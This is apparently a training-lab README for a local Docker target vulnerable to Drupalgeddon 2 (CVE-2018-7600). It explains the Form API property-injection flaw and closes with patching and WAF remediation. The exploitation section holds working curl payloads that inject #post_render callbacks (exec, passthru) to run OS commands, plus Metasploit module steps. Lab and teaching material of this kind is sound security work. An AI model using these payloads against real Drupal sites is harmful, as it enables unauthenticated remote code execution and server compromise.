# Drupalgeddon 2 (CVE-2018-7600): Unauthenticated Form API Property Injection RCE

## Overview

Drupalgeddon 2 (CVE-2018-7600) is one of the most severe unauthenticated Remote Code Execution vulnerabilities in modern web Content Management Systems. Affecting Drupal core versions 7.x, 8.x (prior to 8.5.1), this flaw scored a CVSS 9.8 Critical rating.

The vulnerability stems from Drupal's internal **Form API render arrays**. Drupal uses associative arrays prefixed with `#` (such as `#post_render`, `#markup`, `#type`) to control how HTML elements are transformed before display. Because Drupal did not sanitize incoming query parameters or form submissions against `#` keys, an unauthenticated attacker could inject arbitrary PHP callbacks directly into the render pipeline.

- **Primary Interface**: `http://localhost:8120`
- **Docker Shortcut**: `./lab start drupalgeddon2`
- **Container Name**: `cyberlab_02_drupalgeddon2`
- **RAM Footprint**: ~200 MB (Apache 2.4 + PHP 7.1 + Drupal 8.5.0)

---

## Architecture & Vulnerability Mechanism

```
+-------------------------------------------------------------+
|                Unauthenticated Attacker Request             |
+-------------------------------------------------------------+
                               |
                   POST /user/register?element_parents=...
                   Payload: form_id=user_register_form
                   &_drupal_ajax=1
                   &mail[#post_render][]=passthru
                   &mail[#type]=markup
                   &mail[#markup]=id
                               v
+-------------------------------------------------------------+
|                     Drupal 8 Form API Engine                |
|                                                             |
|  1. Parses nested array parameters into form structure      |
|  2. Finds property '#post_render' => ['passthru']           |
|  3. Invokes callback on '#markup' value:                     |
|        call_user_func('passthru', 'id')                     |
|                                                             |
|  [Result: Remote OS Command Execution under www-data]       |
+-------------------------------------------------------------+
```

---

## Exploitation Walkthrough

### 1. Verification of Vulnerability via Curl
You can trigger the vulnerability by sending a crafted AJAX form submission to `/user/register`:

```bash
curl -k -i -X POST 'http://localhost:8120/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=id'
```

### 2. Spawning a Command Output Stream
To view command output cleanly via `passthru`:

```bash
curl -k -s -X POST 'http://localhost:8120/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=passthru&mail[#type]=markup&mail[#markup]=uname -a; whoami; cat /etc/issue'
```

The server immediately executes the command and echoes the operating system information back in the AJAX JSON response envelope.

### 3. Automated Metasploit Exploitation
You can also exploit this target using the official Metasploit module:
```bash
msfconsole -q
use exploit/unix/webapp/drupal_drupalgeddon2
set RHOSTS 127.0.0.1
set RPORT 8120
set TARGETURI /
exploit
```

---

## Defensive Remediation & Hardening

1. **Drupal Core Upgrades**:
   Update Drupal 8.5.x installations to 8.5.1 or later. The patch introduces `\Drupal\Component\Utility\RequestSanitizer::clean()`, which strips any incoming request keys starting with `#`.
2. **Web Application Firewall (WAF) Filtering**:
   Deploy rules blocking requests containing `#post_render`, `#lazy_builder`, or URL-encoded variations (`%23post_render`) targeting registration, password reset, or comment forms.

---

## Video Walkthroughs & Technical References

- [Drupalgeddon2 & snapd privilege escalation | ARMAGEDDON @ HackTheBox](https://www.youtube.com/watch?v=kgD6jd_HxM4)
- [Drupalgeddon2 Analysis and POC](https://www.youtube.com/watch?v=t04FhbdB2Yk)
- [Vulhub Drupal CVE-2018-7600 Advisory](https://vulhub.org/#/environments/drupal/CVE-2018-7600/)
- [Drupal Security Advisory SA-CORE-2018-002](https://www.drupal.org/sa-core-2018-002)
